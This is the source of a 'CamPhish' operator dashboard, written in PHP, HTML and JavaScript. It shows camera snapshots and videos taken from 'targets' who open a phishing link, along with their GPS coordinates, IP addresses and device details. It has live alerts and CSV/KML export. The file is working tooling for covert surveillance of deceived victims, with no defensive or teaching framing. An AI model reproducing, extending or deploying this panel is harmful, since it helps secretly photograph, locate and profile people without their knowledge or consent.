<?php
$sessionName = getenv('SESSION_NAME') ?: 'default';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CamPhish Dashboard</title>
<style>
:root{--bg:#0d1117;--surface:#161b22;--border:#30363d;--text:#c9d1d9;--text-muted:#8b949e;--accent:#58a6ff;--green:#3fb950;--yellow:#d29922;--red:#f85149;--purple:#bc8cff;--radius:8px}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
.hidden{display:none!important}
.header{background:var(--surface);border-bottom:1px solid var(--border);padding:12px 20px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:100;flex-wrap:wrap;gap:8px}
.header h1{font-size:18px;color:var(--accent);white-space:nowrap}
.header-controls{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.session-badge{font-size:12px;color:var(--text-muted);background:var(--bg);padding:4px 10px;border-radius:12px;border:1px solid var(--border)}
.live-dot{width:8px;height:8px;border-radius:50%;background:var(--green);display:inline-block;animation:pulse 1.5s infinite}
.live-dot.paused{background:var(--yellow);animation:none}
.btn{padding:6px 14px;border-radius:6px;border:1px solid var(--border);background:var(--surface);color:var(--text);cursor:pointer;font-size:12px;font-weight:600;transition:all .15s}
.btn:hover{border-color:var(--accent);color:var(--accent)}
.btn:active{transform:scale(.96)}
.btn.primary{background:var(--green);color:#fff;border-color:var(--green)}
.btn.danger{background:var(--red);color:#fff;border-color:var(--red)}
.btn-sm{padding:3px 8px;font-size:11px}
.toggle{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--text-muted)}
.toggle input{width:auto}
.container{max-width:1400px;margin:0 auto;padding:16px}
.stats-bar{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:20px}
.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:14px;position:relative;overflow:hidden;transition:border-color .2s}
.stat-card:hover{border-color:var(--accent)}
.stat-card .label{font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.5px}
.stat-card .value{font-size:28px;font-weight:800;color:var(--accent);margin-top:4px;font-variant-numeric:tabular-nums}
.stat-card .sub{font-size:11px;color:var(--text-muted);margin-top:2px}
.stat-card.flash-update{animation:flashGreen .6s}
.stat-card .icon{position:absolute;top:12px;right:12px;font-size:20px;opacity:0.3}
@keyframes flashGreen{0%{border-color:var(--green);box-shadow:0 0 12px rgba(63,185,80,0.4)}100%{}}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
.toolbar{display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap;align-items:center}
.search-box{flex:1;min-width:180px;padding:7px 12px;background:var(--bg);border:1px solid var(--border);border-radius:6px;color:var(--text);font-size:13px}
.search-box:focus{outline:none;border-color:var(--accent)}
select.btn{appearance:auto}
.tabs{display:flex;gap:4px;margin-bottom:16px;border-bottom:1px solid var(--border);flex-wrap:wrap}
.tab{padding:10px 18px;cursor:pointer;font-size:13px;font-weight:600;color:var(--text-muted);border-bottom:2px solid transparent;transition:all .15s}
.tab:hover{color:var(--text)}
.tab.active{color:var(--accent);border-bottom-color:var(--accent)}
.tab .count{font-size:10px;background:var(--border);padding:1px 6px;border-radius:8px;margin-left:4px}
.tab.active .count{background:var(--accent);color:var(--bg)}
.section{display:none}
.section.active{display:block}
.grid{display:grid;gap:12px}
.grid.captures{grid-template-columns:repeat(auto-fill,minmax(180px,1fr))}
.grid.locations{grid-template-columns:repeat(auto-fill,minmax(260px,1fr))}
.capture-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;cursor:pointer;position:relative;transition:all .2s;animation:slideIn .3s ease}
.capture-card:hover{border-color:var(--accent);transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,0.4)}
.capture-card.recent{border-color:var(--green)}
.capture-card .thumb{width:100%;height:140px;object-fit:cover;display:block;background:var(--bg)}
.capture-card .thumb-placeholder{width:100%;height:140px;display:flex;align-items:center;justify-content:center;background:var(--bg);font-size:32px}
.capture-card .info{padding:8px 10px}
.capture-card .name{font-size:11px;color:var(--text);word-break:break-all;line-height:1.3}
.capture-card .meta{font-size:10px;color:var(--text-muted);margin-top:3px;display:flex;justify-content:space-between}
.capture-card .badge{position:absolute;top:6px;right:6px;font-size:9px;padding:2px 6px;border-radius:8px;background:rgba(0,0,0,0.7);color:#fff}
.capture-card .badge.video{background:var(--purple)}
.capture-card .del-btn{position:absolute;top:6px;left:6px;width:22px;height:22px;border-radius:50%;background:rgba(248,81,73,0.9);color:#fff;border:none;cursor:pointer;font-size:12px;display:none;align-items:center;justify-content:center}
.capture-card:hover .del-btn{display:flex}
.capture-card .del-btn:hover{background:var(--red)}
@keyframes slideIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
.location-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:14px;transition:border-color .2s}
.location-card:hover{border-color:var(--accent)}
.location-card .coords{font-size:14px;color:var(--accent);font-family:monospace;cursor:pointer}
.location-card .coords:hover{text-decoration:underline}
.location-card .acc{font-size:11px;margin-top:4px}
.location-card .acc.good{color:var(--green)}
.location-card .acc.ok{color:var(--yellow)}
.location-card .acc.poor{color:var(--red)}
.location-card .maps-link{margin-top:8px}
.location-card .maps-link a{font-size:12px;color:var(--green);text-decoration:none}
.location-card .maps-link a:hover{text-decoration:underline}
.location-card .time{font-size:11px;color:var(--text-muted);margin-top:6px}
.location-card .actions{display:flex;gap:6px;margin-top:8px}
.ip-table{width:100%;border-collapse:collapse}
.ip-table th{text-align:left;font-size:11px;color:var(--text-muted);text-transform:uppercase;padding:8px 10px;border-bottom:1px solid var(--border)}
.ip-table td{padding:8px 10px;font-size:12px;border-bottom:1px solid var(--border)}
.ip-table tr:hover{background:var(--surface)}
.ip-table .ip{font-family:monospace;color:var(--accent);cursor:pointer}
.ip-table .ip:hover{text-decoration:underline}
.ip-table .device-tag{font-size:10px;padding:2px 8px;border-radius:8px;display:inline-block}
.ip-table .device-tag.Mobile{background:#1f3a2e;color:var(--green)}
.ip-table .device-tag.Desktop{background:#1f2e3a;color:var(--accent)}
.ip-table .device-tag.Tablet{background:#3a2e1f;color:var(--yellow)}
.ip-table .device-tag.Unknown{background:var(--border);color:var(--text-muted)}
.ip-table .new-entry{animation:flashGreen .6s}
.empty{text-align:center;padding:60px 20px;color:var(--text-muted)}
.empty h3{font-size:16px;color:var(--text);margin-bottom:8px}
.empty .icon{font-size:48px;opacity:0.3;margin-bottom:12px}
.pagination{display:flex;gap:6px;justify-content:center;margin-top:20px;align-items:center}
.pagination .info{font-size:12px;color:var(--text-muted);margin:0 8px}
.lightbox{position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:1000;display:none;align-items:center;justify-content:center;padding:20px}
.lightbox.active{display:flex}
.lightbox img,.lightbox video{max-width:95%;max-height:90vh;border-radius:8px}
.lightbox .close{position:absolute;top:16px;right:20px;color:#fff;font-size:36px;cursor:pointer;line-height:1}
.lightbox .nav{position:absolute;top:50%;transform:translateY(-50%);color:#fff;font-size:36px;cursor:pointer;padding:16px;user-select:none;opacity:0.7}
.lightbox .nav:hover{opacity:1}
.lightbox .nav.prev{left:10px}
.lightbox .nav.next{right:10px}
.lightbox .lb-info{position:absolute;bottom:16px;left:50%;transform:translateX(-50%);color:#ccc;font-size:12px;text-align:center}
.lightbox .lb-actions{position:absolute;bottom:50px;left:50%;transform:translateX(-50%);display:flex;gap:8px}
.activity-feed{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:12px;max-height:300px;overflow-y:auto}
.activity-item{font-size:12px;padding:6px 0;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px;animation:slideIn .3s}
.activity-item:last-child{border-bottom:none}
.activity-item .act-icon{font-size:14px}
.activity-item .act-time{color:var(--text-muted);font-size:10px;margin-left:auto}
.analytics{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:16px;margin-bottom:20px}
.analytics-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:16px}
.analytics-card h3{font-size:14px;color:var(--text);margin-bottom:12px}
.bar-chart{display:flex;flex-direction:column;gap:6px}
.bar-row{display:flex;align-items:center;gap:8px;font-size:12px}
.bar-row .bar-label{width:80px;color:var(--text-muted);text-align:right}
.bar-row .bar-fill{height:18px;border-radius:3px;background:var(--accent);min-width:2px;transition:width .3s}
.bar-row .bar-val{font-size:11px;color:var(--text-muted)}
.toast{position:fixed;bottom:20px;right:20px;padding:12px 20px;border-radius:8px;font-size:13px;z-index:2000;animation:slideUp .3s;display:flex;align-items:center;gap:8px}
.toast.success{background:var(--green);color:#fff}
.toast.error{background:var(--red);color:#fff}
.toast.info{background:var(--accent);color:#fff}
@keyframes slideUp{from{transform:translateY(20px);opacity:0}to{transform:translateY(0);opacity:1}}
.loading{display:inline-block;width:14px;height:14px;border:2px solid var(--border);border-top-color:var(--accent);border-radius:50%;animation:spin .6s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.last-update{font-size:11px;color:var(--text-muted)}
@media(max-width:600px){.header{padding:10px 12px}.container{padding:10px}.stats-bar{grid-template-columns:repeat(2,1fr);gap:8px}.stat-card .value{font-size:22px}.grid.captures{grid-template-columns:repeat(2,1fr)}.grid.locations{grid-template-columns:1fr}.ip-table{font-size:11px}.ip-table th,.ip-table td{padding:6px 4px}.search-box{width:100%}}
</style>
</head>
<body>
<div class="header">
<h1>🎯 CamPhish Dashboard</h1>
<div class="header-controls">
<span class="session-badge">Session: <?= htmlspecialchars($sessionName) ?></span>
<span class="last-update" id="lastUpdate">—</span>
<span class="live-dot" id="liveDot"></span>
<div class="toggle">
<input type="checkbox" id="autoRefresh" checked>
<label for="autoRefresh">Auto</label>
</div>
<div class="toggle">
<input type="checkbox" id="soundAlert">
<label for="soundAlert">🔊</label>
</div>
<select class="btn" id="refreshInterval">
<option value="3000">3s</option>
<option value="5000" selected>5s</option>
<option value="10000">10s</option>
<option value="30000">30s</option>
</select>
<button class="btn" id="refreshBtn">🔄 Refresh</button>
</div>
</div>

<div class="container">
<div class="stats-bar" id="statsBar">
<div class="stat-card"><div class="icon">📷</div><div class="label">Captures</div><div class="value" id="statCaptures">0</div><div class="sub" id="statCapturesSize">0 MB</div></div>
<div class="stat-card"><div class="icon">📍</div><div class="label">Locations</div><div class="value" id="statLocations">0</div><div class="sub" id="statLocationsSub">GPS pins</div></div>
<div class="stat-card"><div class="icon">🌐</div><div class="label">Unique IPs</div><div class="value" id="statUniqueIps">0</div><div class="sub" id="statTotalIps">0 total visits</div></div>
<div class="stat-card"><div class="icon">📊</div><div class="label">Data Size</div><div class="value" id="statDataSize">0</div><div class="sub">MB captured</div></div>
<div class="stat-card"><div class="icon">⏱</div><div class="label">Session</div><div class="value" id="statSession">0m</div><div class="sub" id="statSessionSub">active</div></div>
</div>

<div class="tabs">
<div class="tab active" data-tab="captures">📷 Captures <span class="count" id="tabCaptures">0</span></div>
<div class="tab" data-tab="locations">📍 Locations <span class="count" id="tabLocations">0</span></div>
<div class="tab" data-tab="ips">🌐 IP Logs <span class="count" id="tabIps">0</span></div>
<div class="tab" data-tab="analytics">📊 Analytics</div>
<div class="tab" data-tab="activity">⚡ Live Feed</div>
</div>

<div class="section active" id="sec-captures">
<div class="toolbar">
<input class="search-box" id="capSearch" placeholder="🔍 Search captures by filename...">
<select class="btn" id="capSort">
<option value="newest">Newest first</option>
<option value="oldest">Oldest first</option>
<option value="largest">Largest first</option>
<option value="smallest">Smallest first</option>
</select>
<button class="btn" id="capExport">📥 Export CSV</button>
<button class="btn danger" id="capDeleteAll">🗑 Delete All</button>
</div>
<div class="grid captures" id="captureGrid"></div>
<div class="pagination hidden" id="capPagination"></div>
</div>

<div class="section" id="sec-locations">
<div class="toolbar">
<button class="btn" id="locExportKml">📥 Export KML</button>
<button class="btn" id="locOpenMaps">🗺 Open All in Maps</button>
</div>
<div class="grid locations" id="locationGrid"></div>
</div>

<div class="section" id="sec-ips">
<div class="toolbar">
<input class="search-box" id="ipSearch" placeholder="🔍 Search IPs...">
<button class="btn" id="ipExport">📥 Export CSV</button>
</div>
<div style="overflow-x:auto">
<table class="ip-table" id="ipTable">
<thead><tr><th>Time</th><th>IP Address</th><th>Device</th><th>Browser</th><th>OS</th><th>User Agent</th></tr></thead>
<tbody id="ipBody"></tbody>
</table>
</div>
</div>

<div class="section" id="sec-analytics">
<div class="analytics">
<div class="analytics-card"><h3>📱 Device Breakdown</h3><div class="bar-chart" id="deviceChart"></div></div>
<div class="analytics-card"><h3>🌍 Browser Breakdown</h3><div class="bar-chart" id="browserChart"></div></div>
<div class="analytics-card"><h3>💻 OS Breakdown</h3><div class="bar-chart" id="osChart"></div></div>
</div>
</div>

<div class="section" id="sec-activity">
<div class="activity-feed" id="activityFeed">
<div class="empty"><div class="icon">⚡</div><h3>No activity yet</h3><p>Live events will appear here</p></div>
</div>
</div>
</div>

<div class="lightbox" id="lightbox">
<span class="close" onclick="closeLightbox()">&times;</span>
<span class="nav prev" id="lbPrev">‹</span>
<span class="nav next" id="lbNext">›</span>
<div id="lbContent"></div>
<div class="lb-actions">
<button class="btn primary btn-sm" id="lbDownload">📥 Download</button>
<button class="btn danger btn-sm" id="lbDelete">🗑 Delete</button>
</div>
<div class="lb-info" id="lbInfo"></div>
</div>

<div id="toastContainer"></div>

<script>
var state={captures:[],locations:[],ips:[],stats:{},activity:[],currentTab:'captures',lightboxIdx:0,autoRefresh:true,refreshMs:5000,prevCaptureCount:0,prevIpCount:0,soundOn:false,sessionStart:Date.now()};
var refreshTimer=null;

function $(id){return document.getElementById(id);}
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function fmtTime(ts){if(!ts)return'—';var d=new Date(ts*1000);return d.toLocaleString();}
function relTime(ts){if(!ts)return'—';var diff=Date.now()-ts*1000;if(diff<60000)return Math.floor(diff/1000)+'s ago';if(diff<3600000)return Math.floor(diff/60000)+'m ago';if(diff<86400000)return Math.floor(diff/3600000)+'h ago';return Math.floor(diff/86400000)+'d ago';}
function fmtSize(b){if(b<1024)return b+' B';if(b<1048576)return(b/1024).toFixed(1)+' KB';return(b/1048576).toFixed(2)+' MB';}
function toast(msg,type){var el=document.createElement('div');el.className='toast '+(type||'info');el.textContent=msg;$('toastContainer').appendChild(el);setTimeout(function(){el.remove();},3000);}
function copyText(t){try{navigator.clipboard.writeText(t);toast('Copied: '+t.substring(0,40),'success');}catch(e){}}
function playBeep(){try{var ctx=new(window.AudioContext||window.webkitAudioContext)();var o=ctx.createOscillator(),g=ctx.createGain();o.frequency.value=880;g.gain.value=0.1;o.connect(g);g.connect(ctx.destination);o.start();g.gain.exponentialRampToValueAtTime(0.001,ctx.currentTime+0.15);o.stop(ctx.currentTime+0.15);}catch(e){}}

async function api(action,params){var url='/api/data.php?action='+action;if(params)for(var k in params)url+='&'+k+'='+encodeURIComponent(params[k]);var r=await fetch(url);return r.json();}

function switchTab(tab){
document.querySelectorAll('.tab').forEach(function(t){t.classList.toggle('active',t.dataset.tab===tab);});
document.querySelectorAll('.section').forEach(function(s){s.classList.toggle('active',s.id==='sec-'+tab);});
state.currentTab=tab;
if(tab==='captures')loadCaptures();
if(tab==='locations')loadLocations();
if(tab==='ips')loadIps();
if(tab==='analytics')loadAnalytics();
}

async function loadStats(){
var s=await api('stats');
var prevCap=state.stats.total_captures||0;
var prevIp=state.stats.unique_ips||0;
state.stats=s;
$('statCaptures').textContent=s.total_captures;
$('statCapturesSize').textContent=s.total_size_mb+' MB';
$('statLocations').textContent=s.total_locations;
$('statUniqueIps').textContent=s.unique_ips;
$('statTotalIps').textContent=s.total_ips+' total visits';
$('statDataSize').textContent=s.total_size_mb;
$('tabCaptures').textContent=s.total_captures;
$('tabLocations').textContent=s.total_locations;
$('tabIps').textContent=s.total_ips;
if(s.first_capture){state.sessionStart=s.first_capture*1000;}
var dur=Math.floor((Date.now()-state.sessionStart)/60000);
$('statSession').textContent=dur+'m';
$('statSessionSub').textContent=s.last_capture?relTime(s.last_capture):'waiting...';
if(s.total_captures>prevCap){$('statCaptures').parentElement.classList.add('flash-update');setTimeout(function(){$('statCaptures').parentElement.classList.remove('flash-update');},600);addActivity('📷','New capture received ('+(s.total_captures-prevCap)+' new)');if(state.soundOn)playBeep();}
if(s.unique_ips>prevIp){$('statUniqueIps').parentElement.classList.add('flash-update');setTimeout(function(){$('statUniqueIps').parentElement.classList.remove('flash-update');},600);addActivity('🌐','New IP visitor detected');if(state.soundOn)playBeep();}
$('lastUpdate').textContent='Updated '+new Date().toLocaleTimeString();
}

async function loadCaptures(){
var search=$('capSearch').value.trim();
var sort=$('capSort').value;
var data=await api('captures',{search:search,sort:sort,per_page:60});
state.captures=data.captures;
var grid=$('captureGrid');
if(data.captures.length===0){grid.innerHTML='<div class="empty" style="grid-column:1/-1"><div class="icon">📷</div><h3>No captures yet</h3><p>Waiting for targets to grant camera access...</p></div>';return;}
var now=Date.now()/1000;
grid.innerHTML=data.captures.map(function(c,i){
var isRecent=(now-c.time)<60;
var isVideo=c.type==='video';
return '<div class="capture-card'+(isRecent?' recent':'')+'" onclick="openLightbox('+i+')">'+
(isVideo?'<div class="thumb-placeholder">🎬</div>':'<img class="thumb" src="'+c.thumb+'" loading="lazy" onerror="this.style.display=\'none\';this.nextElementSibling.style.display=\'flex\'"><div class="thumb-placeholder" style="display:none">📷</div>')+
'<div class="badge'+(isVideo?' video':'')+'">'+(isVideo?'VIDEO':'IMG')+'</div>'+
'<button class="del-btn" onclick="event.stopPropagation();deleteCapture(\''+esc(c.name)+'\')">×</button>'+
'<div class="info"><div class="name">'+esc(c.name)+'</div>'+
'<div class="meta"><span>'+relTime(c.time)+'</span><span>'+fmtSize(c.size)+'</span></div></div></div>';
}).join('');
}

async function loadLocations(){
var data=await api('locations');
state.locations=data.locations;
var grid=$('locationGrid');
if(data.locations.length===0){grid.innerHTML='<div class="empty" style="grid-column:1/-1"><div class="icon">📍</div><h3>No locations captured</h3><p>GPS data appears when targets grant location access</p></div>';return;}
grid.innerHTML=data.locations.map(function(l){
var acc=parseFloat(l.accuracy)||999;
var accClass=acc<10?'good':acc<50?'ok':'poor';
var accText=acc<10?'High precision':acc<50?'Medium precision':'Low precision';
return '<div class="location-card">'+
'<div class="coords" onclick="copyText(\''+esc(l.lat)+', '+esc(l.lon)+'\')">📍 '+esc(l.lat)+', '+esc(l.lon)+'</div>'+
'<div class="acc '+accClass+'">'+accText+' ('+esc(l.accuracy)+'m)</div>'+
'<div class="maps-link"><a href="'+esc(l.maps)+'" target="_blank">🗺 Open in Google Maps →</a></div>'+
'<div class="time">'+fmtTime(l.time)+'</div>'+
'<div class="actions"><button class="btn btn-sm" onclick="copyText(\''+esc(l.lat)+', '+esc(l.lon)+'\')">📋 Copy</button></div>'+
'</div>';
}).join('');
}

async function loadIps(){
var data=await api('ips');
state.ips=data;
var body=$('ipBody');
if(data.entries.length===0){body.innerHTML='<tr><td colspan="6" class="empty"><div class="icon">🌐</div><h3>No IP logs yet</h3><p>IP addresses appear when targets visit your link</p></td></tr>';return;}
var search=$('ipSearch').value.toLowerCase();
var filtered=search?data.entries.filter(function(e){return e.ip.toLowerCase().includes(search)||e.ua.toLowerCase().includes(search);}):data.entries;
body.innerHTML=filtered.slice(0,100).map(function(e,i){
return '<tr class="'+(i<2&&data.entries.length>state.prevIpCount?'new-entry':'')+'">'+
'<td>'+esc(e.timestamp)+'</td>'+
'<td class="ip" onclick="copyText(\''+esc(e.ip)+'\')">'+esc(e.ip)+'</td>'+
'<td><span class="device-tag '+esc(e.device)+'">'+esc(e.device)+'</span></td>'+
'<td>'+esc(e.browser)+'</td>'+
'<td>'+esc(e.os)+'</td>'+
'<td style="max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="'+esc(e.ua)+'">'+esc(e.short_ua)+'</td>'+
'</tr>';
}).join('');
state.prevIpCount=data.entries.length;
}

async function loadAnalytics(){
var data=await api('ips');
function renderChart(elId,counts){
var el=$(elId);
var max=0;for(var k in counts)if(counts[k]>max)max=counts[k];
var html='';
for(var k in counts){
var pct=max>0?Math.round(counts[k]/max*100):0;
html+='<div class="bar-row"><div class="bar-label">'+esc(k)+'</div><div class="bar-fill" style="width:'+pct+'%"></div><div class="bar-val">'+counts[k]+'</div></div>';
}
el.innerHTML=html||'<div class="empty">No data</div>';
}
renderChart('deviceChart',data.device_breakdown||{});
renderChart('browserChart',data.browser_breakdown||{});
renderChart('osChart',data.os_breakdown||{});
}

function addActivity(icon,msg){
state.activity.unshift({icon:icon,msg:msg,time:new Date().toLocaleTimeString()});
if(state.activity.length>50)state.activity.pop();
renderActivity();
}
function renderActivity(){
var el=$('activityFeed');
if(state.activity.length===0){el.innerHTML='<div class="empty"><div class="icon">⚡</div><h3>No activity yet</h3><p>Live events will appear here</p></div>';return;}
el.innerHTML=state.activity.map(function(a){return '<div class="activity-item"><span class="act-icon">'+a.icon+'</span><span>'+esc(a.msg)+'</span><span class="act-time">'+a.time+'</span></div>';}).join('');
}

function openLightbox(idx){
state.lightboxIdx=idx;
var c=state.captures[idx];
if(!c)return;
var lb=$('lightbox');lb.classList.add('active');
var content=$('lbContent');
if(c.type==='video'){content.innerHTML='<video src="'+c.url+'" controls autoplay style="max-width:95%;max-height:80vh;border-radius:8px"></video>';}
else{content.innerHTML='<img src="'+c.url+'" style="max-width:95%;max-height:80vh;border-radius:8px">';}
$('lbInfo').textContent=esc(c.name)+' · '+fmtSize(c.size)+' · '+fmtTime(c.time);
$('lbDownload').onclick=function(){var a=document.createElement('a');a.href=c.url;a.download=c.name;a.click();};
$('lbDelete').onclick=function(){deleteCapture(c.name);closeLightbox();};
}
function closeLightbox(){$('lightbox').classList.remove('active');$('lbContent').innerHTML='';}
function lbNav(dir){
var idx=state.lightboxIdx+dir;
if(idx<0)idx=state.captures.length-1;
if(idx>=state.captures.length)idx=0;
openLightbox(idx);
}

async function deleteCapture(name){
if(!confirm('Delete '+name+'?'))return;
var r=await fetch('/api/data.php',{method:'DELETE',headers:{'Content-Type':'application/json'},body:JSON.stringify({file:name})});
var d=await r.json();
if(d.status==='deleted'){toast('Deleted: '+name,'success');loadCaptures();loadStats();}
else toast('Delete failed','error');
}

function exportCsv(filename,rows){
var csv=rows.map(function(r){return r.map(function(c){return '"'+String(c).replace(/"/g,'""')+'"';}).join(',');}).join('\n');
var blob=new Blob([csv],{type:'text/csv'});var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=filename;a.click();
toast('Exported '+filename,'success');
}

function doRefresh(){
loadStats();
if(state.currentTab==='captures')loadCaptures();
if(state.currentTab==='locations')loadLocations();
if(state.currentTab==='ips')loadIps();
}

function startAutoRefresh(){
if(refreshTimer)clearInterval(refreshTimer);
if(state.autoRefresh)refreshTimer=setInterval(doRefresh,state.refreshMs);
}

document.querySelectorAll('.tab').forEach(function(t){t.addEventListener('click',function(){switchTab(t.dataset.tab);});});
$('refreshBtn').addEventListener('click',doRefresh);
$('autoRefresh').addEventListener('change',function(){state.autoRefresh=this.checked;$('liveDot').classList.toggle('paused',!this.checked);startAutoRefresh();});
$('soundAlert').addEventListener('change',function(){state.soundOn=this.checked;});
$('refreshInterval').addEventListener('change',function(){state.refreshMs=parseInt(this.value);startAutoRefresh();});
$('capSearch').addEventListener('input',function(){clearTimeout(this._t);this._t=setTimeout(loadCaptures,300);});
$('capSort').addEventListener('change',loadCaptures);
$('ipSearch').addEventListener('input',loadIps);
$('capExport').addEventListener('click',function(){var rows=[['Filename','Size','Time']];state.captures.forEach(function(c){rows.push([c.name,c.size,fmtTime(c.time)]);});exportCsv('captures.csv',rows);});
$('ipExport').addEventListener('click',function(){var rows=[['Timestamp','IP','Device','Browser','OS','UserAgent']];state.ips.entries.forEach(function(e){rows.push([e.timestamp,e.ip,e.device,e.browser,e.os,e.ua]);});exportCsv('ip_logs.csv',rows);});
$('locExportKml').addEventListener('click',function(){var kml='<\x3fxml version="1.0"\x3f><kml xmlns="http://www.opengis.net/kml/2.2"><Document>';state.locations.forEach(function(l){kml+='<Placemark><name>'+esc(l.name)+'</name><Point><coordinates>'+esc(l.lon)+','+esc(l.lat)+'</coordinates></Point></Placemark>';});kml+='</Document></kml>';var blob=new Blob([kml],{type:'application/vnd.google-earth.kml+xml'});var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='locations.kml';a.click();toast('Exported locations.kml','success');});
$('locOpenMaps').addEventListener('click',function(){if(state.locations.length===0)return;var l=state.locations[0];window.open(l.maps,'_blank');});
$('capDeleteAll').addEventListener('click',function(){if(!confirm('Delete ALL captures? This cannot be undone.'))return;if(!confirm('Are you absolutely sure? All camera snapshots will be permanently deleted.'))return;state.captures.forEach(function(c){fetch('/api/data.php',{method:'DELETE',headers:{'Content-Type':'application/json'},body:JSON.stringify({file:c.name})});});toast('Deleting all captures...','info');setTimeout(function(){loadCaptures();loadStats();},1000);});
$('lbPrev').addEventListener('click',function(){lbNav(-1);});
$('lbNext').addEventListener('click',function(){lbNav(1);});
document.addEventListener('keydown',function(e){if(!$('lightbox').classList.contains('active'))return;if(e.key==='Escape')closeLightbox();if(e.key==='ArrowLeft')lbNav(-1);if(e.key==='ArrowRight')lbNav(1);});
$('lightbox').addEventListener('click',function(e){if(e.target===this)closeLightbox();});

doRefresh();
startAutoRefresh();
</script>
</body>
</html>
